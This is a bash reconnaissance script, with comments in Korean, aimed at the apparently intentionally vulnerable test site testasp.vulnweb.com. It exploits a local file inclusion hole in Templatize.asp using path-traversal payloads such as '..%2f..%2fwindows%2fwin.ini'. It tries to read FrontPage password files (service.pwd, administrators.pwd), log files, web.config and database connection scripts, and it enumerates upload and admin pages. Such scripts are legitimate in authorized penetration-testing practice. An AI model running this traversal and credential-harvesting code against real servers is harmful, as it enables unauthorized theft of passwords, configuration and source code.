#!/usr/bin/env bash
# Round 12 recon — 신규 축: (A) C:\scripts\ 로그 경로 (B) FrontPage 확장 (_vti_*)
#                       (C) 업로드/파일매니저 후보 (D) 미발견 ASP 스크립트 열거
# 전부 읽기 전용(GET). 상태 변경 없음.
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; mkdir -p "$OUT"
CURL=(curl -s --noproxy '*' --max-time 25)

lfi() { # $1=label $2=item값  → Templatize LFI (200=읽힘, 500=없음)
  local label="$1" item="$2" code size
  read -r code size < <("${CURL[@]}" -o "$OUT/lfi_${label}.html" -w "%{http_code} %{size_download}" \
      "$BASE/Templatize.asp?item=$item")
  printf "  %-26s %-56s %s %s\n" "$label" "$item" "$code" "$size"
}
http() { # $1=label $2=경로 → 직접 HTTP GET
  local label="$1" path="$2" code size
  read -r code size < <("${CURL[@]}" -o "$OUT/http_${label}.out" -w "%{http_code} %{size_download}" "$BASE$path")
  printf "  %-26s %-56s %s %s\n" "$label" "$path" "$code" "$size"
}

echo "### A. C:\\scripts\\ 로그·스크립트 경로 (logInput.asp 소스에서 경로 확보)"
echo "  -- LFI: 웹루트=C:\\ 2단계이므로 '..%2f..%2fscripts%2f...' 가 C:\\scripts\\"
for n in logInput.txt log.txt input.txt logInput.log access.log error.log \
         scripts.txt debug.txt upload.log applog.txt install.log; do
  lfi "scripts_$n" "..%2f..%2fscripts%2f$n"
done
lfi "scripts_dir_self"  "..%2f..%2fscripts"
lfi "scripts_login_txt" "..%2f..%2f..%2fscripts%2flogInput.txt"   # 깊이 오차 대조군
lfi "control_winini"    "..%2f..%2fwindows%2fwin.ini"             # ★ 대조군(실존)

echo
echo "### B. FrontPage Server Extensions (_vti_*) — 직접 HTTP"
for p in /_vti_inf.html /_vti_pvt/service.pwd /_vti_pvt/administrators.pwd \
         /_vti_pvt/authors.pwd /_vti_pvt/users.pwd /_vti_pvt/service.cnf \
         /_vti_pvt/access.cnf /_vti_bin/shtml.dll /_vti_bin/_vti_aut/author.dll \
         /_vti_bin/_vti_adm/admin.dll /_vti_bin/_vti_aut/author.exe \
         /_vti_cnf/Default.asp /_vti_log/ /_vti_txt/ /_vti_script/; do
  http "fp$(echo "$p" | tr '/.' '__')" "$p"
done
echo "  -- 같은 대상 LFI (웹루트 기준 상대경로)"
for p in _vti_inf.html _vti_pvt/service.pwd _vti_pvt/administrators.pwd \
         _vti_pvt/authors.pwd _vti_pvt/users.pwd _vti_pvt/service.cnf; do
  lfi "vti_$(echo "$p" | tr '/.' '__')" "$p"
done

echo
echo "### C. 업로드·파일매니저·편집기 후보 (LFI = 평문 소스 열람)"
for n in upload.asp uploadfile.asp fileupload.asp Upload.asp saveimage.asp \
         imageupload.asp imgmanager.asp filemanager.asp file_manager.asp \
         upload_image.asp attach.asp attachment.asp media.asp editor.asp \
         tiny_mce_upload.asp tinyupload.asp browse.asp elfinder.asp \
         uploader.asp upload_file.asp up.asp save.asp write.asp; do
  lfi "up_$n" "$n"
done
lfi "tinymce_plugin_mcpuk" "jscripts/tiny_mce/plugins/mcpuk/editor_plugin.js"
lfi "tinymce_plugin_ver"   "jscripts/tiny_mce/tiny_mce.js"

echo
echo "### D. 미발견 ASP 스크립트·설정 열거 (LFI 존재 오라클)"
for n in admin.asp conn.asp connection.asp dbconn.asp include.asp inc.asp \
         config.asp settings.asp setup.asp install.asp test.asp temp.asp \
         xmlrpc.asp api.asp soap.asp service.asp ws.asp mail.asp sendmail.asp \
         contact.asp news.asp newslist.asp addnews.asp editnews.asp delnews.asp \
         adduser.asp useradd.asp users.asp edituser.asp admin_user.asp \
         stats.asp counter.asp count.asp guestbook.asp forum.asp topics.asp \
         addtopic.asp movetopic.asp deltopic.asp poll.asp vote.asp \
         profile.asp userinfo.asp mypage.asp board.asp list.asp write1.asp \
         menu.asp top.asp bottom.asp footer.asp header.asp global.asp \
         main.asp index.asp home.asp; do
  lfi "asp_$n" "$n"
done

echo
echo "### E. 대조군 2차 (회차 유효성 재확인)"
lfi "control2_dbasp"  "db.asp"
lfi "control2_webcfg" "web.config"
